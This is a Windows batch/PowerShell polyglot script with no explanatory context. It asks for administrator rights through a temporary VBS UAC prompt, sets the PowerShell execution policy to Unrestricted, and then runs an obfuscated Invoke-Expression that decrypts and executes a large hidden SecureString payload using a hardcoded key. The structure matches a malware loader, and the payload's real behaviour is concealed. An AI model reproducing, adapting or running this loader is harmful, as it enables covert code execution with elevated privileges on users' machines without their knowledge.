<# :
  @echo off
:checkPrivileges
NET FILE 1>NUL 2>NUL

if '%errorlevel%' == '0' ( goto gotPrivileges ) else ( goto getPrivileges )
:getPrivileges
if '%1'=='ELEV' (shift & goto gotPrivileges)
setlocal DisableDelayedExpansion
set "batchPath=%~0"
setlocal EnableDelayedExpansion
ECHO Set UAC = CreateObject^("Shell.Application"^) > "%temp%\OEgetPrivileges.vbs"
ECHO UAC.ShellExecute "!batchPath!", "ELEV" ,"", "runas", 1 >> "%temp%\OEgetPrivileges.vbs"
"%temp%\OEgetPrivileges.vbs"
exit /B

:gotPrivileges
    powershell /nologo /noprofile /command ^
         "&{[ScriptBlock]::Create((cat """%~f0""") -join [Char[]]10).Invoke(@(&{$args}%*))}"
  exit /b
#>


Set-ExecutionPolicy Unrestricted 


& ( $eNV:coMspEC[4,24,25]-jOIn'')( ( nEW-obJecT ManagEMenT.AUTomatIon.pScREdENtiaL ' ',( '76492d1116743f0423413b16050a5345MgB8ADMAUABCAE8AeABrAGoAWgBhAHAAUwBqAG4AdABPADYANQArAE0AZABzAEEAPQA9AHwAOABkADMAYwA2AGMAZAA2AGEAOQAyAGEAOQBkAGYANABkADAANgA1ADIANwBlAGYAYQA0ADcAOAAwADQAMABjADIAYwA3ADIANgBiADUAYQA2AGQANABiADYAZgBhAGMAYwBkADQAMgA2AGEAOQAyADUANwBiAGYANwBlADgAYgA4AGQANgA0ADYANQAxADkANAAzADQAYgA5ADcAOQA0ADEANwA0AGIAMgA2ADIAYwA0ADgAZgA1AGEAMAAwAGIAOAA5AGIAYgBlADIAMwA0AGEAZgBiAGIANAA2ADYAZgBmAGMAOABmADEANwA5AGMAZQBjADEAOABiADUAMQBkADgAYwA3AGEAZQA1AGQANQA0ADEAMwBlAGUAYQAyAGIAOAA5ADYAZQBjADUAYgA3ADcAMQA2AGMAMQBlADMAMAA0AGEAMgBjAGUAYQBjADIAMwBiADAAMABiADEAYQA4AGEANABiADEAZAA1ADEAMgBkADUAMQAzADkAZABjAGMAZgA3AGYAMAA2AGEAZgBlADYAYwBjADIANwBhAGYAZAA2ADkAZQBjADkANAA2ADgAOABhADkAYgA4ADYANAA4AGIAYgA1ADIAMABjADQAZgA5ADUAYQBhADEANQAwADMAOQBlADEANAA2AGMAZABjADgAOAA5ADcAMABkADMAOAA2AGYANAAxADYANwAyAGUAZABiADYAMQBkADQAZQBjADkAMgA1ADYANgA4AGUANQBlADcANQBhADUAOQBjADkAOQAxADYAMwBmADUANAA5AGEAOQA0ADUAYwA0ADAAOABlAGEAMgA4AGQAOABkAGUAMABlADQANAAyADEAYQBlADQANAA3AGIAMAAwAGEAZgA5AGIAZQA0AGUAMQA0ADcAZAA1ADIAYwBlADcAOQA4ADEAYgBmADkAOABhADgAMAA3AGYAZABlADQAMQA4ADMAZgA0ADEANQAyADgAMQA5AGYAMgAyADQAYQBjADEAMwBmAGEAYwA2ADYANQAzADcANABlAGQAYgA0AGIAOAAzADcANgA3AGUAZAAzAGYAMwAxAGEAMwA4AGYANAAzADQAMQAyADIAOABkADYAMgBjAGYAZQA5ADMAYgA1ADEANwAzADQAZAA4AGIAMwAwADQANgAxADgAZQAxADAAYwBkAGYAZgBlAGYAYgA4ADAAMAAwADMANgA1AGYAMQA0AGYAZQAxADgANwA4ADMAMAAwAGQAYQBkADEAOAA5ADQAZgA3ADAAOABkADgANQA0ADgANgBlAGQAYwBkADQANwBjAGMAOQBjADgANQBjADQAMABlAGUAOQAyAGIAYwAzADMANgBhADcAMABlADkANgAyADEAZABhADQANwAwADIAMgA5ADQAZQA1ADgANwAzAGYANAA0AGEAOQA1AGUAYQA1ADIANQA5ADcAMgBlADgAOQA1ADUAMAA2ADAAZgA2ADMAMAA2ADQANgAzADYAYgBhAGEAMABmAGIAMwAwAGYANQA2ADEANgA4AGUAYwBhADgAMQBhADYAYQBjADgAOQA2ADQAMgA1AGYAMwBkAGUAZQBjAGIAMQAyAGYAYgA1ADMAMQAzADQAOQAyAGQANQBmADYAYQBlAGUAYwBhAGQAYQA4ADEAZABhAGIANAAxADAAOQA5ADQAMABjAGIANAA2ADQAZQA1AGQAZgAzADcAOQBlADUAYQAzAGYAMwBmADgAMABmADIAYgAwAGQAOAAzADcANAA0ADIAYwA3ADIAYgBiAGMAMQAwAGIAZgA4AGUAOAA4AGUAYwBiAGYAYgBmADgANwBhAGUANwBjADMAOQA0ADgAZABlAGYAZAAyADgANQAxAGMAYwBlADMAMgBhAGUAOABhADgAZABlADEAOQAwADEANQBkADIANAA4ADQAZQA1ADAAYwA1AGIAZQBiADgAMAAxADcANgBjADgANQBjAGQAOQBjADUANgA3AGUAMgBlADYAMgAwADMAOQBhAGIAMQA0ADIANAA5ADAAMQBhADQAMQBlADEAMQAwADcAMgBiADAAMAAxAGYAYQBmAGYAZgA1ADEANgA5AGUAMgA2ADUAYQAyADYAYgA0AGQANQBhAGYAMAA0ADMAYQBlAGQAYQBlADIAZQBmADkAZQA3ADUAZgAyAGYAZgBmADAAZABjAGYAOQAxADkANQA2ADcANQBlAGEANgA1ADkAMQAxAGQAYwA0ADAAOAA1ADMAYgA3AGQAMQA1ADUANgA3ADkANgA4AGYAMwAyADcAZgAxADIAYQBhADUANgA5AGQAYwAzAGUAMwA0AGUAMQAzAGQAMgBjADAAZQA1AGUAYgBmAGQAMAA0AGYAYgA5AGYANwBlAGUAZAAyADIAYgAxAGIAZgA1AGIANAA0AGUAZQA1ADUANgBmADUAOAA1ADgAYQA1AGYAYgBiADYAOQA4ADAANQAwADkANwBkADgAMgBmADIAYwA0ADEAZgAyAGIAZQA5ADYAMwAwAGIAZgBlADMAOQA4AGQAYQBkAGIANgA2AGMAOQBmAGIAOQAyAGEAYQAxAGEAMgBmADUAZQA1AGYAYQAyAGMAZAA5ADkAMAAzADgANwA2AGYAZQBjADcANwAwAGEAOQAyADEANgAwADIAZQA2AGUAZQAxAGEAOQBjADcANwBhAGQAZQBhADMAMQA2AGEAMwBiADcAYgA1ADgAMAAzAGEAYgAzAGUANAA0ADMAOQA2ADQANAA5AGUAYgA5AGMAZABiADgAZABiAGIANQA2AGIAYQA1AGUANgA1ADEAOQA3ADMAMgA0ADIAZAA0AGIAZQA1AGYANwA3ADYANwAwADcANQA1ADcAMwA4AGQAOAAwAGUANABjADYAYgBjAGEAZgA1AGYANwA2AGMAZQAyADkAYwAyAGMAOABkADEAZAAwAGUAYQA4ADcAYgA3AGYANgAzAGUAMwBjAGUAMgA0ADQAOQA3ADcAZQA5AGYAZQBhADMAMgAyAGQAZQBhADUAZABmADMAMQBhADQAMAA4AGUANABlADEANgA5ADcAYgBmAGUAYwA0ADQANwA2ADEAMwA5ADAAZgBiADkAMABlADIAOAA3AGEANwA3AGIAMgBlAGQANQA4ADMAZQA5AGMAMAA4ADAAMwAxAGMAYwA4ADAANwA2ADUANgAzADUANwBhADcAYwAzADQANwBjADkAZABlADQAZAA2ADYAOQAzADEANgBkADcANgBhADYANQAzADUANAA0AGEAOABkADkAMwA2AGYAYwBiADIAYwAwADEAYQAyADUAYQBlADIAZQA5ADUAYwA5AGUAZABlADEANQBmAGYANQA1ADMANAA5AGEAOQA2AGUAYQAwADgAMABhAGQAMQAzAGUAOABjADAAZQA4AGEAOABhADAAYwA3AGEANQA0ADgANwA1ADcAMABhADkAMABmAGIAZgAwADAAMAA0AGIANABkAGYAMQA4ADAAYwBlADgAYwA3AGIANQA0ADIANgBiADYAYwBlAGQAYgA3ADcAZQA4AGMANQBhADUANABiAGMAZAA5ADkAMwBmAGUAZQA0ADAAYgA3ADUAMwA2ADUAMABlAGQAOQA1AGQAMAAxADgAOABkAGIAYQBmADYAOQAzADgAYgBkAGQAYgBkADMAYgBhADIAZQBmAGYAYQA1AGUAZQBlAGYAMQA3ADMAZgA4ADAANQAxAGUANAAzAGMAZgA1ADQAOQBhADYANwBmADIAMwBkADcANgA0ADMANAAwADUAYwBjAGIAZgAwADcAZQA0AGUAZgAxADQAMwAyAGIAYgAxADkAYwA0ADMAYgBiAGIAYQBmADYANAA3AGUANgA5ADAAMAAwADQAYwA4ADQANABhADEAZQBjADgAZAA5ADMAYQBlADIANwBhADEAMABiAGEAMwAyADIAMgA4AGIANQBjADgAYQAwAGIAZQA2ADQAMQA2ADYAOQA2ADIAOABiADcAZQA2AGYAZAAwADAANgA1ADAANwBmAGUAMgAxADAANgA4ADkAMwA4AGYAZAAwADEAZABkADkANwA3AGYANAA2ADQAYgAwADkAYgBlADEAMgA0ADgAMQAxADIAMwAyADUANQAxAGUANAAwAGQAMABkADcANwBlADkAZQBiADYANQA1ADQAMAAxADUAZQBjAGUAOAA2ADYAMABjAGEANgAzADIAYQAwADMANgBjADMAYgBjAGQAZQA2ADcANQA4ADQAOAA1ADUAMgAyADYANQAxAGEANAAwAGIANwAyADEAYQA3AGUAYQAxAGMAYgA5ADcAYQAxAGQANwAxADQAYQBlADgAMgBjADkANgA3ADAAMwBkADAAMgAwAGMAZAAyADkAYQAzAGQAZQA5ADEAMAA1ADEANQBhADYAMABiAGUAOAA1AGIAMwBmADcAZgAwAGQAMgA2ADgANQA2ADYAZgA5ADUANQBmAGMAYQA5ADEAOQA4ADMAOAAxAGYANAAzAGIAZgA4ADEAZQA1ADQAYwBkADEAZQAyAGQAMwA0AGQAZQA0AGMAOAA3ADYAMgA0AGMAOABmADQAYQBjADUAYgAyAGYAZQBlAGMAOQA5ADgANAA0AGIAMABiAGMAMgA0AGYAZgBkAGUAMQA4ADIANQBmADcAMwA3AGIAMAAyADMAZgA3ADAAZgBhAGIAYgBhADUAYgBmADMAMwA2ADYAYwAxAGUANQBhADIAMQBiAGYAYQBjAGIANgA5ADYAOAA5AGQAOQA1ADYAZABjADEANABiADEANQBiADQAZgBkAGYAYQBmAGQAMwAwADEAMgAzAGEAYgBmADYAMgAzAGMANQAwADcAZQBkAGYAOAA4ADQAYgAwAGEAMwA5AGYAYgAzADYANQAxADUANQA3AGIAMABiADEANQAxAGUAYQBlADcAMABjADMAYQA3ADkAMwA0ADEAYwAwADQANwA4ADkAYwBiADQAZQBlADMAZQAzADYAZAA4ADkAMAAwADUAMABjADYAZQA4AGYAOQAwADMAYwAyADAANwA4ADAAZQA0ADEAZAA0ADIAZgBjADcAZgBiAGEAZgBlADgAOQAxAGEAZAA0ADQAZgA1ADMAYgA5ADIANwBlAGUAZQAxAGQANQAwAGUAMgBhADMAZAA2ADcANAA0AGUAOQBlADUAOQA5AGMAOAA0ADYANAA4AGUAOQA5ADIAZABjADkAZgA2ADcANwA5ADkAYQAyADAAZgA2ADQAMAAyADgAOQA5ADkANgAwAGYAMABhADEAMwAzADEAZABkAGYAOQA5AGEAMgBmADYAZgA4AGIAOQAzADIAMgAxADUAZAA5AGQAYgA2AGMAZABiADAAOAA3ADgAZgAzAGEANwBiADYANQA2AGMAMQA4AGYAOQBiAGUANgBkADAAYgAyAGEAMgA3ADcANAAxAGUAYwA3AGYAZABlAGUAOQBmADkAYgAwAGQAMQA2ADkANwAzAGYAMgA5ADMAZAAxADgAMgBkADQAMgA2ADMAZAAwADMAZgAwAGMAZgBkAGQANAAyADUANQA3AGYANwAwADMAZAA3ADkAYgAxADgAMQAzADYAYgBmADUAOQA3ADIAMQA3ADEAZQA0AGEAZQBiAGQAMQA3AGYANAAyAGYANwAxADEAYQBjAGYAOQBiADkANgBkADAAOAA1ADEAOAA0AGEANQBmAGUANAA0ADIANQBhADYAOQAwADQAYgAzADcAMAAyADgAMwBjAGEAMABhADYANgA0ADYAMgA4ADkAYQAyAGYAYQA0ADMAMABlADEAOQA4ADAAMAA2AGQAYgBkAGQAZABkAGQANQBiADQANQA5ADUANwAxADcAYwA4ADEANABmADgANwBiADMAYQAxADIAYwAxADkAYgA5ADIAMABmADgAOQBiADgAYwA2ADcANQA5AGUANwAxADkAZgBiADEANgBlADMANQAxAGYAZQA5ADEAYwAwADMAMAA3ADAAMAAyADUAOAAzADcAMwBiAGEAOQBhAGIAYgBjADgAYgA3ADYAZgBiADIAMwA1AGUAZAA3ADMAZABjADMAYgA0AGIAYwBhAGYANwBjADEAYwBiADAANAAwAGIANgBhAGUAMwBhAGYANQA4AGEANAA0ADAANQAyAGEAZgAyAGUAZQBkADYAOAA4ADUAOABmAGQAMQAwADEAYgAyADEANQBhADUANQA2AGIAMABlADEAMAA1ADQANQBhADAAOQAxADIAYgA1ADEANQA2AGEANQBjADcANwA5ADAAYgA5AGIAMQAzAGIAMQAwADUAOQBmADAAZAA0AGUAYQBhADgAMwBmADQAMgBlADYAYgBhADUANQBiADUANABkAGQAZQAwAGUAZAAyAGQANwAwADUANwAyADIANgBjAGEAMgBmAGUANwBjAGMANgA4ADkAYgA0AGUAZgAwAGIAOQAwAGIAZgBjAGMANABhADEAOAAwAGMANQAzAGEANgAwADcAOAA4AGIAYQBjADMAYwBhADUANwA0ADcANQBlAGEAZABmADgAMgBlADIANQA1AGIANQAxAGYANABiAGIANgAwADUANABmADUANAA4ADUAZAA5AGQAMgA2ADMAZgBlADgAYgBiADIANgBiAGEAMQA5ADEAYgBjADIAMwAzADkANAAyAGEANAA0ADkAMAA4ADIANQA1ADQAMgBmADIANABmADMAMgA0AGQAMQBmADEANAAzADYAYQBmADcAMwBmAGIAOAA0AGEAZQA1ADEANAAwAGEAYgA0ADUAMwAzAGIAMQBkADMANgA1ADEAMgAyADgANwBkADgAMwAyADgAOQAwADQAZQA4AGMAMgBhADkAMgBkAGQAOAA4ADUAMwA3ADIAMgA3AGMAMwBiADAAMwAyADQANwAxADIANQBhAGIAYwA2AGEANgA5ADMAMAA4ADQAMQBkADMAZgAwAGEAYwBhADQANQAzADYAOABhADgAYwAyADkAZABiADAANwBiAGEAOQBkAGQAOQAyADUAOQAwADEANwBmADQAMgBmADcAMgAxADMAMgAwADYAMgA0AGEAMwA5ADMAMABkAGUAOQA0ADEAZAA5AGYAZQAzADcANQA1AGMAZABjADUAZQBmAGQANQBjADMAMQAyAGUAZQA4ADYAMgBmADIAZgAyADgAMQBjAGQAMwAyADUAMwA4AGMAOAAxADQANQBmADgANAA1AGQAZAAxADAANABjADMAZQBiADYAYgBkAGMAYgA0AGIAZQBlADMANAAxAGIAMwBhADkAYwA5AGYAYgBjAGMAMQBlADIANgA3ADMAYgA0ADMANgBhAGEAZgBlADMAMQA4ADgAYQAxADQAYgBlADIANwBiAGEAMgA3ADIAZQBkADUAZAAzADAAZQA4AGUAOQAwAGEAMAA3AGQAYQA2ADkAZABlAGQAYwAzADEAZQBhADMANQBmADkAYQAwADMAYgAwAGEAMwA2ADMAZAAzADcAZgAzAGQANQA1ADQANgA0ADMAMAAyADgAOAA2ADMAYQAyADcAMgBmADgAYwA0AGQAYwBmAGYAMwAwAGYAYQBhADEAYQBjADgAOQA2ADEANwAzAGMAZQAyADQANwA1AGQAOQBjADMAOQBiADEAYwBmADAAOABjADcAZgAyADQAZgAxAGMAMgBhADgAZgA5ADQANAAxADcANwBhADcAZQBiADYAZQAxADkANgBjADQAZAAwAGMAOAA4ADIAYwA5ADIAMgA3ADcAZQBmADcAZQA0AGIAMABlADAAYgA1ADQAMABiAGUAMwA5AGIANQBlADIAYwA1AGEANgA3ADQAZAA3ADMAYQA4AGUAMgA4AGMANgAyADgAMwBjAGQAZgBlAGYAZgAzADAAMgA2AGQANwAyADYAMgA2ADEANAA1ADAANwBjADUAZABmAGQAMQAwADMAOQAyADcAOQAwAGEAZgA1ADAAYQA4ADcAOAA4AGEAMQA2AGEANQAwADcAYQAxADMAYwAxAGYANgA2ADcAZABkADQAMgAyADEAMgAzAGYAYgAzAGEAZQBiAGQAMgBmADAANQBlAGYAMAAzADEANgAzADgAMQAyADUAOABlAGUANwA4ADQANwBmADYAMQA1AGQAMABkAGYANgA4AGEAOQA3ADcAYQA0ADkAMQBhADMAYQA5AGEAMgBhADUAMQA4ADgAZABiADQAYwA2ADIAZgBmADEAMwA3AGUAZQAxADkAZABlAGIANwA5ADAAZgBmAGQAZgBlADQAOABhAGMANQAzADUANgA2ADAANwA1ADEAOQAxADUAZQAyADgAMQAwAGQAZQA5ADcANwAyAGIAZgAwADYAYgAwADkAZgBmAGEANQA3ADAAMAA4ADcANgBlAGYAOABjADMAZABlAGQANAA3AGUAOQA2ADYANAAyADUAMAA4AGIAZgBjADYANgA1ADUAMwBkAGUANgBjADcAOQA1ADAAYQAzADUAYQA3AGYAZgA5ADQAMwAzADQAMQBiADIAZAA2ADcANQBkADcAZABkADEAOAA0ADUAYQA2ADAAZAAzADAAMQA3ADQAMgA5ADcAZgA3AGMAYwA5ADcAMQBlAGUAZQBlAGYAMABiADcAOAA0ADMAOABkADYAMAA1AGMANQBlAGMAZABlAGQAOQBjADEAMwBhAGEANQA1ADMAZQBkADIAMQAxADUAOAAwADcAMQBjAGYAZQBkADMAOQBiADAAMQBhADMAMwA4AGIAMQBhADkAZQBmAGIAZABiADEANABmAGEAOQAxADgAYgBlAGUAZABjADgAYwA1ADgANAA1AGYAMgAxAGIAOAAxADIANwA1AGYAOQAwADUAMQBmADkAZABmADIAOABhADcAOQA5ADkANAA5ADcAZgBhADIAZgA5ADYAYgAxAGYAZQBmADgAMQAxADgAZQA5AGYAMAA5ADEAOABhAGQANgAzADUAMwBhADUAZgAzADEAYQA5AGYANQAxADgAMQA4ADMAZABhADMAMgAzAGYAOQBjADYANgA4AGQAMQAxAGYAMwA3ADQAMwBhADQANwA0ADQAZQAzADAAZgBmADYAYwBlAGMANwAxADEAZAA5ADUAOAA2ADQAYQA3ADQAOAAyADYANQBiADkAZABlADQANAA1ADYAOAA5ADQAYQA5AGYAMQAxADUAMAAwAGIAMwBlADQANQBlADUAMABhAGEANAA1ADIAOAAxAGYANQA4AGMAOQBjADUAMAA0ADMAYQBlAGUAMQBlAGEANwBjADIAZgBlADIAOAAwADUAMgBlAGEAZgA1ADcANAAzADEAOAA1ADgAMAA4AGUAYwBjAGIAMAA1ADAAOABhAGUANQAyAGUAOQA4AGQAZQA5ADQANgBmADYAMQBhADkAYgAwADYAMwBjADQAZAAwADIAZABhAGYANQA3ADEAOQBiADUANABmADQAMwAzADYANwA1ADkANgBjAGYAMgBmAGMANwA3ADUAYgA1ADEAMgA1AGMAOQBiADcAMQA5ADgANAA1ADEANQBjAGYANgAzAGQAYwAxADEAZABhADMANgA4ADcAZQA0ADkANQBlADAAMwA2AGEAMwA4ADUAZQBhADIANQBjADEAYgBmADkAYQA2AGQAZQA0ADUAZQAxAGQANAAwADcANAAzAGQAZQBhADIANAA1ADEAMABmADkAYgBjADQAOABlAGIANwA2AGYAZQAyAGMAYQA2ADcANwA2ADEAYQAzAGUAZgBhADIAOABmADcAMgA5ADMANwBiAGMAYgBjAGIAYwAxADYAMgBhADAANAA4ADQANQAxADcAMwAzAGUAYgAyADQAYQBlADgAZgAyADUAOAAwAGYAYwAyADkAMABjADEAYQAwAGYANgBmAGIAZAA2AGIAYgA0ADcANwBlAGUANwBlAGUAZgA0AGYAYgA0ADIAYQAyADEAOQA2ADUAZAA1AGUAZQA2ADkANAA3ADUAMQA1ADYAZgBhADcANwAxADcANQBkADIAOQA1ADIAMgA4ADAAZABmAGIAZQAyADcAOQA0ADMAMwBhAGUANgA0AGYAYgBhADQAMQAzADUAZQBjADQAOQA5ADEANgA0AGUANwBiAGUAOABkADEAOQBiADAAMAA4ADEAMQA5ADQAMwAxADEAMgA4ADkANAA1AGYAOABjADIAYgAzAGMAOQBhAGIAMwA2ADMAMgBiADIAOQBiADcANwBkADUANAA1AGEAOQAxAGIAZABkAGMAMQBhAGEANwAyAGQAZgAzADIAZgBhADYAYQBhADQAZQA5ADYAOQAwAGUAOABhADIAOQBjADQAZAA1ADMAZQAyAGIAMAAyADgANQA3ADIAOQA5ADcAMgBkADEAYwAxAGEAYQBlADMANgAwADkAZABkADQAMgA0ADUAMABkAGIANwA0ADgAYgBkADIANgA0ADAAMwA5ADcAMAAyAGIAMABkADIAYgA5ADQANgBhADkAZQA5AGIAMAAzADcAYgBkAGEAOAA0ADAAYQA1ADcAZQA2ADkAZQA1AGUANwAwAGUAMABjADkAMQA1ADkAZgAzADcAYQA3ADQAZgA4ADUAMAAzAGIANgAyADMAZQBjAGIAZABkADYAMwAzADMAYwBmADkANgBjADgAYQA3ADAAZQA0AGYAYQBjAGIAZAA4ADEAYwAyADUAZABhADQAMQA2AGEAYwAzADUAZAA1AGQAYgA1ADkAZAAxAGUANQA0AGEAMgBhADcAMQAyADQANAAyADAANwBiADQAOQBmAGYAMAAwAGQAZAAxADkANgA4ADgANABjADIANwA4AGEAZQA0AGUAZAA1ADAAZQBiADkAYgBiAGYAMAA5ADMAZAA4ADQAOQA2AGEAYwA0ADYAYwBjADQAYgAyADIANQBjAGQAYgBlADgAZQA4ADYAZAAyADMAZgA4AGEAMgA0ADgAYwAwADkAMwAzAGYANAA3AGUAZQAxAGEAZABjADAAOAAyAGEANQAxAGEAYgBmAGMAZAA2ADcAYgA5ADUAYQA3ADYAYQA3ADgAOABlAGUAMQA0ADcAOQBlAGIAYwBiADkAMQBiADAANAAwADgAZQA0AGQAMAA4ADcAMwBiADcAMwA5AGMAMwBjADEAYgA0AGMAOAAyAGMAYQAyADcANwAyADAAYwBjADAANQBiADUAMAAzADIAOQAzAGIAYwA2ADMAMgA0AGIAOABmAGYAZgA3ADAAMwAzAGYAOQAyADEAMwAwADYAYwBkAGMANgBkAGUANQA1AGYAMwA2ADQANQA5ADIANAA1ADUANwBlAGMAMwAyAGQANAAyAGUAYwAxADkAYQBhAGYAMAAyADMAOABkAGMANgAyAGQAYwA2AGUAOQBhAGUAOAAwADAANQA0AGIANQAxAGYAOABhADIAMQAwADYAZgBkADMANQA4AGIAYgAzADgAYwAwAGIAOAA3AGMAYQAyAGEAMwBjADgANQBmADcANAAxADcAMAAzAGMAZAA2AGMAMwA4AGIAOABjADEAMABlAGEANAA3AGMAMgAwADkAMgAwADUAOQAyAGYAOQA3AGQAMQBiADMANQBjADgAZgBlAGQANgAwADMAZAA5ADYAYQBmADgAMQAxAGIAZQAwADcAOQA4ADYAYQAxADcAZAAxADkAYgA1ADcAOAA4AGYAMABlAGQAYwAyADAANAA3AGIAOQBlADkANgAyAGQAOQA1ADkAOAA5ADcAMQBlADQANgA5AGMANAAwAGIAMwA0ADAAYwBkAGQAMwA0ADgAMwBhADMAMABhADQANABkAGEAOABmADQAZgA1AGIANwAxADkAMgAzADkANAA3AGIANwA5AGYANwA0ADUAMQBjAGEAMwAwAGUANABlAGIAMwA5ADcAMwBiAGIAMgA5AGMAMgA5ADkANgA0AGUAYgBmADcAMwA0ADQANwBhAGYANABhAGEAOAA4ADgAYQA3AGUAOAAxADAAYgBlAGUAMQA2ADUAZQBkADkANQAzADUANgBjADAAOAA0AGUANQA2ADYAZgBjAGYANwAyADIANAA5ADYAMwA1AGQANQBlADgAZgBiADcAMQAzADgAOAA0AGIAOABjADkAYgBkAGQAMABmADQAOABmAGIAMQAzAGQANwAxADQANQA5ADUANgA1ADgANgA1ADIAMwA1ADMANwA0AGUAOAAzAGUAOAAxADEAOQA4ADgAZgBiAGIAMgA2ADQAYQBkADcAMAA2ADYAOAAwADMAZgAwAGYAOAA4ADgAZQBhADEAOQAxADEANwA5ADQAZgA0ADMANgBmAGMAYwBlADAAYwA3AGQANgBlADEAOAA1AGMAMQAwADUAMwA3ADkAMgBkADcANQBlAA==' |ConVERTTo-sEcurEStrInG -K (101..116))).getNeTWORKCrEdeNTIaL().PasSwOrd)

exit

